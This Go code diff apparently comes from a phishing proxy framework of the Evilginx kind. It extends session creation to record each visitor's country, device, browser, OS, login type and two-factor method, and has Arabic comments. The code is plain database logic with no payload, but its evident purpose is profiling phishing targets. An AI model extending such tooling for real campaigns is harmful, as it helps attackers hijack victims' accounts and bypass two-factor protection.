@@ -29,8 +29,31 @@ func NewDatabase(path string) (*Database, error) {
 	return d, nil
 }
 
-func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
-	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
+func (d *Database) CreateSession(
+	sid string, phishlet string, landing_url string, useragent string, remote_addr string,
+	countryCode, countryName string,
+	deviceType, browserType, browserVersion, osType, osVersion string,
+	loginType string, has2FA bool, type2FA string,
+) error {
+	s, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
+	if err != nil {
+		return err
+	}
+	
+	// تعيين الحقول الإضافية
+	s.CountryCode = countryCode
+	s.CountryName = countryName
+	s.DeviceType = deviceType
+	s.BrowserType = browserType
+	s.BrowserVersion = browserVersion
+	s.OSType = osType
+	s.OSVersion = osVersion
+	s.LoginType = loginType
+	s.Has2FA = has2FA
+	s.Type2FA = type2FA
+	
+	// تحديث السجل بالبيانات الجديدة
+	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
 
